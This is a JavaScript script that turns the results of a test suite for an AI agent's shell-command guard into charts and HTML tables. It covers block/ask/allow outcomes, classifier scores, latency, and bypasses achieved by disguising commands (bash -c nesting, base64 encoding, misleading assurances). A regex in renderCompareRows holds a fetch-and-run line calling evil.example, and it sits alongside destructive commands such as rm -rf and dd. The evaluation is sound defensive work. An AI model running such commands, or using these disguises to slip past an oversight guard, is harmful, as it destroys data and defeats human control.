/**
 * overview-charts.mjs — the Overview page's figures, from the devious suite.
 * No network: reads the recorded devious run and its replay against
 * pi-permission-system, then writes everything docs/index.html inlines.
 *
 *   npm run overview       # then npm run docs:sync
 *
 * Inputs:
 *   tests/jev-devious.json       npm run devious, the 856-attempt suite
 *   tests/compare-results.json   npm run compare
 *
 * Writes (tokenized SVGs, see svg-util.mjs, and HTML fragments):
 *   overview-outcomes.svg        what the guard did with every attempt
 *   overview-scores.svg          where the scores fell, hostile above ordinary
 *   overview-families.svg        the 20 paired families, hostile and ordinary halves
 *   overview-disguise.svg        the same commands plain, wrapped, and vouched for
 *   overview-layers.svg          which layer decided, and what it cost
 *   overview-latency.svg         how long the classifier took
 *   overview-stats.html          the stat strip
 *   overview-misses.html         every result that differed from its expectation
 *   overview-compare-rows.html   four real rows from the replay
 */
import { readFileSync, writeFileSync } from "node:fs";
import { ON, P, axisLine, barSeg, clip, escXml, label, legend, subtitle, svgClose, svgOpen, title } from "./svg-util.mjs";

const RUN = new URL("./jev-devious.json", import.meta.url);
const REPLAY = new URL("./compare-results.json", import.meta.url);

const { meta, families, rows } = JSON.parse(readFileSync(RUN, "utf-8"));
const replay = JSON.parse(readFileSync(REPLAY, "utf-8"));

const write = (name, text) => writeFileSync(new URL(`./${name}`, import.meta.url), text, "utf-8");
const count = (list, test) => list.filter(test).length;
const bandColor = (band) => ({ allow: P.allow, ask: P.ask, block: P.block })[band] ?? P.error;
const pct = (n, d) => (d === 0 ? "0%" : `${Math.round((n / d) * 100)}%`);

const attacks = rows.filter((r) => r.kind === "attack");
const ordinary = rows.filter((r) => r.kind === "trap");
const scored = rows.filter((r) => r.caughtBy === "jev" && typeof r.danger === "number");
const bands = (list) => ({
  block: count(list, (r) => r.final === "block"),
  ask: count(list, (r) => r.final === "ask"),
  allow: count(list, (r) => r.final === "allow"),
});
const A = bands(attacks);
const O = bands(ordinary);
const bypasses = rows.filter((r) => r.bypass);
const hardBlocked = rows.filter((r) => r.falsePositive);
const softer = rows.filter((r) => !r.match && !r.bypass && !r.falsePositive);
const errors = count(rows, (r) => r.final === "error" || r.error);

const latencies = scored.map((r) => r.latencyMs).sort((a, b) => a - b);
const lat = {
  avg: Math.round(latencies.reduce((a, b) => a + b, 0) / latencies.length),
  p50: latencies[Math.floor(latencies.length * 0.5)],
  p95: latencies[Math.floor(latencies.length * 0.95)],
  max: latencies.at(-1),
};

const WORDS = {
  hostile: { block: "blocked", ask: "asked first", allow: "ran" },
  ordinary: { allow: "ran", ask: "asked first", block: "blocked" },
};
const ORDER = { hostile: ["block", "ask", "allow"], ordinary: ["allow", "ask", "block"] };

/** One segmented bar in counts, with each segment's count printed inside when it fits. */
function segments({ x, y, height, unit, counts, order, name, words }) {
  let s = "";
  let cx = x;
  const present = order.filter((band) => counts[band] > 0);
  present.forEach((band, i) => {
    const w = counts[band] * unit;
    const last = i === present.length - 1;
    s += barSeg({ x: cx, y, width: w - (last ? 0 : 2), height, fill: bandColor(band), end: last, tip: `${name}: ${counts[band]} ${words[band]}` });
    const text = String(counts[band]);
    if (w - 2 >= text.length * 7.5 + 6) {
      s += label(cx + (w - (last ? 0 : 2)) / 2, y + height / 2 + 4.5, text, { anchor: "middle", size: 12, weight: 700, fill: ON[band] });
    }
    cx += w;
  });
  return { svg: s, end: cx };
}

// ------------------------------------------------------------- 1. outcomes
function renderOutcomes() {
  const W = 1060, L = 190, R = 40, T = 104, PITCH = 104, BH = 36;
  const H = T + PITCH * 2 + 44;
  const unit = (W - L - R) / Math.max(attacks.length, ordinary.length);
  const harmless = attacks.filter((r) => r.final === "allow" && !r.bypass).length;

  let s = svgOpen(W, H, { alt: `What the guard did with ${rows.length} attempts` });
  s += title(24, 34, `What the guard did with ${rows.length} attempts`);
  s += subtitle(24, 58, `Jev 1.13 via OpenRouter · ${meta.stamp} · ask at ${meta.askThreshold}, block at ${meta.blockThreshold} · local rules included · bar length is a count`);

  const groups = [
    { key: "hostile", name: "Hostile attempts", note: `${attacks.length} attack-labelled`, counts: A },
    { key: "ordinary", name: "Ordinary work", note: `${ordinary.length} controls`, counts: O },
  ];
  groups.forEach((g, i) => {
    const y = T + i * PITCH;
    s += label(L - 16, y + 17, g.name, { anchor: "end", size: 14, weight: 650 });
    s += label(L - 16, y + 35, g.note, { anchor: "end", size: 11.5, fill: P.dim });
    s += segments({ x: L, y, height: BH, unit, counts: g.counts, order: ORDER[g.key], name: g.name, words: WORDS[g.key] }).svg;
    s += legend(L, y + BH + 26, ORDER[g.key].map((band) => ({ color: bandColor(band), label: `${g.counts[band]} ${WORDS[g.key][band]}` })));
  });

  s += label(24, H - 16,
    `An ask blocks when nobody is there to answer, so an unattended agent is stopped by ${A.block + A.ask} of ${attacks.length} attacks. ` +
    `${harmless} of the ${A.allow} that ran ${harmless === 1 ? "is a harmless probe, expected to run" : "are harmless probes, expected to run"}.`,
    { size: 12, fill: P.dim });
  s += svgClose();
  return s;
}

// --------------------------------------------------------------- 2. scores
function renderScores() {
  const W = 1060, L = 96, R = 44, T = 132, PH = 150, GAP = 70;
  const CW = W - L - R;
  const BINS = 20;
  const bw = CW / BINS;
  const binOf = (d) => Math.min(BINS - 1, Math.floor(Math.round(d * 100) / 5));
  const zone = (i) => (i * 0.05 >= meta.blockThreshold - 1e-9 ? "block" : i * 0.05 >= meta.askThreshold - 1e-9 ? "ask" : "allow");
  const panels = [
    { name: "Hostile attempts", list: scored.filter((r) => r.kind === "attack") },
    { name: "Ordinary work", list: scored.filter((r) => r.kind === "trap") },
  ].map((p) => {
    const bins = Array(BINS).fill(0);
    for (const r of p.list) bins[binOf(r.danger)] += 1;
    return { ...p, bins };
  });
  const max = Math.max(...panels.flatMap((p) => p.bins));
  const H = T + panels.length * PH + GAP + 30;
  const x = (v) => L + v * CW;

  let s = svgOpen(W, H, { alt: "Where the danger scores fell" });
  s += title(24, 34, "Where the scores fell");
  s += subtitle(24, 58, `${scored.length} attempts scored by Jev, counted in steps of 0.05. The ${rows.length - scored.length} settled by local rules carry no score.`);
  s += legend(24, 86, [
    { color: P.allow, label: `under ${meta.askThreshold}: runs` },
    { color: P.ask, label: `${meta.askThreshold} to ${meta.blockThreshold}: asks first` },
    { color: P.block, label: `${meta.blockThreshold} and up: blocked` },
  ]);

  panels.forEach((p, i) => {
    const top = T + i * (PH + GAP / 2);
    const base = top + PH - 22;
    const scale = (PH - 48) / max;
    s += label(24, top + 4, p.name, { size: 13.5, weight: 650 });
    s += label(24, top + 22, `${p.list.length} scored`, { size: 11.5, fill: P.dim });
    p.bins.forEach((n, b) => {
      if (n === 0) return;
      const h = Math.max(2, n * scale);
      const bx = L + b * bw + 3;
      const tip = `${p.name}: ${n} scored ${(b * 0.05).toFixed(2)} to ${((b + 1) * 0.05).toFixed(2)}`;
      s += barSeg({ x: bx, y: base - h, width: bw - 6, height: h, fill: bandColor(zone(b)), tip });
      s += label(bx + (bw - 6) / 2, base - h - 6, String(n), { anchor: "middle", size: 11, weight: 600, fill: P.dim, tabular: true });
    });
    s += axisLine(L, base, L + CW);
    for (const t of [0, 0.25, 0.5, 0.75, 1]) s += label(x(t), base + 16, t.toFixed(2).replace(/0$/, ""), { anchor: "middle", size: 11, fill: P.muted, tabular: true });
  });

  for (const [t, text] of [[meta.askThreshold, `ask ${meta.askThreshold}`], [meta.blockThreshold, `block ${meta.blockThreshold}`]]) {
    const tx = x(t).toFixed(1);
    s += `<line x1="${tx}" y1="${T - 18}" x2="${tx}" y2="${H - 44}" stroke="${P.border}" stroke-width="1.5" stroke-dasharray="5 4"/>\n`;
    s += label(x(t) + 6, T - 20, text, { size: 11.5, fill: P.muted, weight: 600 });
  }
  s += label(24, H - 14, "0 = routine, 1 = destructive or exfiltrating. Hover a bar for its range.", { size: 12, fill: P.dim });
  s += svgClose();
  return s;
}

// ------------------------------------------------------------- 3. families
function renderFamilies() {
  const labels = Object.fromEntries(families.map((f) => [f.family, f.label]));
  const fresh = [...new Set(rows.filter((r) => r.variant !== "legacy").map((r) => r.family))];
  const list = fresh.map((family) => {
    const hostile = rows.filter((r) => r.family === family && r.kind === "attack");
    const benign = rows.filter((r) => r.family === family && r.kind === "trap");
    return { family, name: labels[family] ?? family, hostile, benign, h: bands(hostile), o: bands(benign) };
  });
  list.sort((a, b) => b.h.allow - a.h.allow || b.o.block - a.o.block || b.h.ask - a.h.ask || b.o.ask - a.o.ask || a.name.localeCompare(b.name));

  const W = 1060, L = 340, GAP = 36, R = 24, T = 150, PITCH = 32, BH = 20;
  const panelW = (W - L - GAP - R) / 2;
  const per = Math.max(...list.map((f) => Math.max(f.hostile.length, f.benign.length)));
  const unit = panelW / per;
  const H = T + list.length * PITCH + 40;
  const leftX = L, rightX = L + panelW + GAP;

  let s = svgOpen(W, H, { alt: "Every new command family, hostile and ordinary" });
  s += title(24, 34, "Every paired family, hostile and ordinary side by side");
  s += subtitle(24, 58, `${list.length} families, each ${per} hostile and ${per} ordinary attempts: six commands a side, each tried three ways. Weakest first.`);
  s += legend(24, 86, [
    { color: P.block, label: "blocked" },
    { color: P.ask, label: "asked first" },
    { color: P.allow, label: "ran" },
  ]);
  s += label(leftX, T - 20, "Hostile attempts", { size: 13.5, weight: 650 });
  s += label(rightX, T - 20, "Ordinary work", { size: 13.5, weight: 650 });

  list.forEach((f, i) => {
    const y = T + i * PITCH;
    s += label(L - 16, y + BH / 2 + 4.5, clip(f.name, 46), { anchor: "end", size: 12.5, weight: 600 });
    s += segments({ x: leftX, y, height: BH, unit, counts: f.h, order: ORDER.hostile, name: `${f.name}, hostile`, words: WORDS.hostile }).svg;
    s += segments({ x: rightX, y, height: BH, unit, counts: f.o, order: ORDER.ordinary, name: `${f.name}, ordinary`, words: WORDS.ordinary }).svg;
  });

  s += label(24, H - 14, "The original 136 cases are broken down by technique on the Devious Tests page.", { size: 12, fill: P.dim });
  s += svgClose();
  return s;
}

// -------------------------------------------------------------- 4. disguise
function renderDisguise() {
  const VIEWS = [
    { variant: "plain", name: "Plain", note: "the command as written" },
    { variant: "nested", name: "Wrapped: bash -c", note: "the bash ones, one shell deeper" },
    { variant: "encoded", name: "Wrapped: encoded", note: "the PowerShell ones, base64 encoded" },
    { variant: "assurance", name: "With a misleading assurance", note: "the request vouches for it" },
  ].map((v) => {
    const hostile = attacks.filter((r) => r.variant === v.variant);
    const benign = ordinary.filter((r) => r.variant === v.variant);
    return { ...v, hostile, benign, h: bands(hostile), o: bands(benign) };
  });

  // Each panel keeps a column to its right for its "n of N" note.
  const W = 1060, L = 250, NOTE = 104, GAP = 16, T = 150, PITCH = 64, BH = 26;
  const panelW = (W - L - 2 * NOTE - GAP - 8) / 2;
  const max = Math.max(...VIEWS.flatMap((v) => [v.hostile.length, v.benign.length]));
  const unit = panelW / max;
  const leftX = L, rightX = L + panelW + NOTE + GAP;
  const H = T + VIEWS.length * PITCH + 34;

  let s = svgOpen(W, H, { alt: "Does disguise help an attack get through" });
  s += title(24, 34, "Does disguise help? The same commands, three ways");
  s += subtitle(24, 58, "Each of the 120 pairs was tried plainly, wrapped one shell deeper, and with a request that vouches for it.");
  s += legend(24, 86, [
    { color: P.block, label: "blocked" },
    { color: P.ask, label: "asked first" },
    { color: P.allow, label: "ran" },
  ]);
  s += label(leftX, T - 20, "Hostile attempts", { size: 13.5, weight: 650 });
  s += label(rightX, T - 20, "Ordinary work", { size: 13.5, weight: 650 });

  VIEWS.forEach((v, i) => {
    const y = T + i * PITCH;
    s += label(L - 16, y + 12, v.name, { anchor: "end", size: 13, weight: 650 });
    s += label(L - 16, y + 29, v.note, { anchor: "end", size: 11.5, fill: P.dim });
    const left = segments({ x: leftX, y, height: BH, unit, counts: v.h, order: ORDER.hostile, name: `${v.name}, hostile`, words: WORDS.hostile });
    s += left.svg;
    s += label(left.end + 8, y + BH / 2 + 4.5, `${v.h.allow} of ${v.hostile.length} ran`, { size: 11.5, fill: P.dim });
    const right = segments({ x: rightX, y, height: BH, unit, counts: v.o, order: ORDER.ordinary, name: `${v.name}, ordinary`, words: WORDS.ordinary });
    s += right.svg;
    s += label(right.end + 8, y + BH / 2 + 4.5, `${v.o.ask + v.o.block} of ${v.benign.length} stopped`, { size: 11.5, fill: P.dim });
  });

  s += label(24, H - 14, "The views share base commands, so they are not independent samples. Bar length is a count.", { size: 12, fill: P.dim });
  s += svgClose();
  return s;
}

// ---------------------------------------------------------------- 5. layers
function renderLayers() {
  const deny = rows.filter((r) => r.caughtBy === "local");
  const pass = rows.filter((r) => r.caughtBy === "fast-pass");
  const jev = rows.filter((r) => r.caughtBy === "jev");
  const cards = [
    { name: "Local rules: hard-deny", count: deny.length, ms: "0 ms", color: P.block, note: "blocked before any network call" },
    { name: "Local rules: read-only fast pass", count: pass.length, ms: "0 ms", color: P.allow, note: "runs with no added latency" },
    { name: "Sent to Jev", count: jev.length, ms: `${lat.avg} ms avg`, color: P.accent, note: `average ${lat.avg} ms, p95 ${lat.p95} ms` },
  ];

  const W = 1060, T = 110, CH = 100;
  const H = T + cards.length * CH + 34;
  let s = svgOpen(W, H, { alt: "Which layer decided, and what it cost" });
  s += title(24, 34, "Which layer decided, and what it cost");
  s += subtitle(24, 58, `${rows.length} attempts: ${deny.length + pass.length} settled locally in 0 ms, ${jev.length} scored by the classifier.`);
  s += subtitle(24, 78, "A hard-deny cannot be overruled by the model, whatever score Jev would have given.");

  cards.forEach((c, i) => {
    const y = T + i * CH;
    s += `<rect x="24" y="${y}" width="${W - 48}" height="${CH - 14}" rx="10" fill="${P.panel}" stroke="${P.border}" stroke-width="1"/>\n`;
    s += `<rect x="24" y="${y}" width="6" height="${CH - 14}" rx="3" fill="${c.color}"/>\n`;
    s += label(52, y + 32, c.name, { size: 15, weight: 700 });
    s += label(52, y + 54, c.note, { size: 12, fill: P.dim });
    s += label(W - 52, y + 38, String(c.count), { size: 30, anchor: "end", weight: 700, fill: c.color, tabular: true });
    s += label(W - 52, y + 60, c.ms, { size: 12, anchor: "end", fill: P.dim });
    const share = c.count / rows.length;
    s += barSeg({ x: 52, y: y + 66, width: share * (W - 300), height: 8, fill: c.color, end: true, tip: `${c.name}: ${pct(c.count, rows.length)} of attempts` });
    s += label(60 + share * (W - 300), y + 74, pct(c.count, rows.length), { size: 11, fill: P.dim });
  });

  s += label(24, H - 14, "Most of this suite is written to get past pattern rules, so the classifier carries it. Any failure there blocks.", { size: 12, fill: P.dim });
  s += svgClose();
  return s;
}

// --------------------------------------------------------------- 6. latency
function renderLatency() {
  const buckets = [
    ["under 200", (v) => v < 200],
    ["200-224", (v) => v >= 200 && v < 225],
    ["225-249", (v) => v >= 225 && v < 250],
    ["250-274", (v) => v >= 250 && v < 275],
    ["275-299", (v) => v >= 275 && v < 300],
    ["300-349", (v) => v >= 300 && v < 350],
    ["350-499", (v) => v >= 350 && v < 500],
    ["500 and up", (v) => v >= 500],
  ].map(([name, test]) => ({ name, count: latencies.filter(test).length }));

  const W = 1060, T = 112, CH = 260, L = 110;
  const H = T + CH + 70;
  const CW = W - L - 60;
  const maxCount = Math.max(...buckets.map((b) => b.count), 1);
  const bw = CW / buckets.length;

  let s = svgOpen(W, H, { alt: "How long Jev takes to answer" });
  s += title(24, 34, "How long Jev takes to answer");
  s += subtitle(24, 58, `${latencies.length} classifier calls · average ${lat.avg} ms · half within ${lat.p50} ms · p95 ${lat.p95} ms · slowest ${lat.max >= 1000 ? `${(lat.max / 1000).toFixed(1)} s` : `${lat.max} ms`}`);
  s += subtitle(24, 78, "This is the whole added cost of a gated call. Local rules and cached verdicts add 0 ms.");

  const baseY = T + CH;
  buckets.forEach((b, i) => {
    const x = L + i * bw + bw * 0.18;
    const w = bw * 0.64;
    const h = (b.count / maxCount) * (CH - 36);
    if (b.count) s += barSeg({ x, y: baseY - h, width: w, height: h, fill: P.accent, tip: `${b.count} calls took ${b.name} ms` });
    s += label(x + w / 2, baseY - h - 8, String(b.count), { anchor: "middle", size: 12, weight: 600, tabular: true });
    s += label(x + w / 2, baseY + 20, b.name, { anchor: "middle", size: 11.5, fill: P.dim });
  });
  s += axisLine(L, baseY, L + CW);
  s += label(L - 12, baseY, "calls", { anchor: "end", size: 11, fill: P.dim });
  s += label(L + CW / 2, baseY + 44, "classifier latency, ms", { anchor: "middle", size: 12, fill: P.dim });
  s += svgClose();
  return s;
}

// ------------------------------------------------------------- fragments
const html = (v) => escXml(v);
const VIEW = { legacy: "original", plain: "plain", nested: "wrapped", encoded: "encoded", assurance: "with assurance" };

function renderStats() {
  const cards = [
    ["", String(rows.length), `attempts: ${attacks.length} hostile, ${ordinary.length} ordinary`],
    [" crit", `${bypasses.length} / ${attacks.length}`, "hostile attempts let through unexpectedly"],
    ["", `${hardBlocked.length} / ${ordinary.length}`, "ordinary commands blocked outright"],
    ["", `${lat.avg} ms`, "average classifier answer"],
    [" good", String(errors), "classifier errors: any failure blocks"],
  ];
  return `<div class="stat-grid">\n${cards.map(([cls, n, text]) => `  <div class="stat-card${cls}"><strong>${n}</strong><span>${text}</span></div>`).join("\n")}\n</div>\n`;
}

function missTable(list, head, noteCol) {
  const body = list
    .map((r) => `<tr><td><code>${html(r.cmd)}</code> <span class="tag">${VIEW[r.variant] ?? r.variant}</span></td><td class="ev">${r.danger.toFixed(2)}</td><td class="why">${html(r[noteCol])}</td></tr>`)
    .join("\n");
  return `<table class="results misses">\n<thead><tr><th>${head}</th><th>Score</th><th>What it is about</th></tr></thead>\n<tbody>\n${body}\n</tbody>\n</table>\n`;
}

function renderMisses() {
  const byScore = (a, b) => a.danger - b.danger;
  const top = Math.max(...bypasses.map((r) => r.danger)).toFixed(2);
  const low = Math.min(...bypasses.map((r) => r.danger)).toFixed(2);
  const inert = hardBlocked.filter((r) => r.family === "inert-vs-active").length;
  let s = "";
  s += `<h3>Hostile attempts that ran</h3>\n`;
  s += `<p class="table-note">${bypasses.length} of ${attacks.length}, every one scored between ${low} and ${top}, under the ${meta.askThreshold} ask line.</p>\n`;
  s += missTable([...bypasses].sort(byScore), "Command", "intent");
  s += `<h3>Ordinary commands blocked outright</h3>\n`;
  s += `<p class="table-note">${hardBlocked.length} of ${ordinary.length}. ${inert} of them only print or syntax-check a dangerous string rather than run it.</p>\n`;
  s += missTable([...hardBlocked].sort(byScore), "Command", "intent");
  s += `<details class="more">\n<summary>${softer.length} more landed one band softer than expected <span>asked where a block was expected, or ran where an ask was</span></summary>\n`;
  s += missTable([...softer].sort(byScore), "Command", "intent");
  s += `</details>\n`;
  return s;
}

function renderCompareRows() {
  const hardened = replay.results.find((r) => r.id === "hardened");
  const picks = ["rm -rf node_modules", "rm -rf dist build", "dd if=/dev/zero of=./testfile", "GIT_PAGER="];
  const theirs = (v) =>
    v.state === "deny" ? `refused, rule <code>${html(v.matched)}</code>`
      : v.state === "allow" ? `runs, rode the <code>${html(v.matched)}</code> allow`
      : "asks first";
  const ours = (v) => ({ block: "blocked", ask: "asks first", allow: "runs" })[v.ours] + `, ${v.danger.toFixed(2)}`;
  const body = picks.map((p) => {
    const v = hardened.verdicts.find((x) => x.cmd.startsWith(p) && x.variant === "legacy");
    if (!v) throw new Error(`replay has no row starting ${p}`);
    const shown = v.cmd.replace(/'curl -s http:\/\/evil\.example\/x\.sh \| sh'/, "'curl -s …|sh'").replace(/ bs=1M count=10$/, "");
    return `<tr><td><code>${html(shown)}</code></td><td>${theirs(v)}</td><td>${ours(v)}</td></tr>`;
  });
  return `<table class="versus">\n<thead><tr><th>Command</th><th>pi-permission-system, hardened</th><th>specpi-jev-guard</th></tr></thead>\n<tbody>\n${body.join("\n")}\n</tbody>\n</table>\n`;
}

write("overview-outcomes.svg", renderOutcomes());
write("overview-scores.svg", renderScores());
write("overview-families.svg", renderFamilies());
write("overview-disguise.svg", renderDisguise());
write("overview-layers.svg", renderLayers());
write("overview-latency.svg", renderLatency());
write("overview-stats.html", renderStats());
write("overview-misses.html", renderMisses());
write("overview-compare-rows.html", renderCompareRows());

console.log(
  `overview — ${rows.length} attempts: attacks ${A.block}/${A.ask}/${A.allow} (block/ask/allow), ` +
    `ordinary ${O.allow}/${O.ask}/${O.block} (allow/ask/block), ${bypasses.length} bypasses, ${hardBlocked.length} hard-blocked, ` +
    `${softer.length} softer, ${errors} errors, latency avg ${lat.avg} p50 ${lat.p50} p95 ${lat.p95} max ${lat.max}`,
);
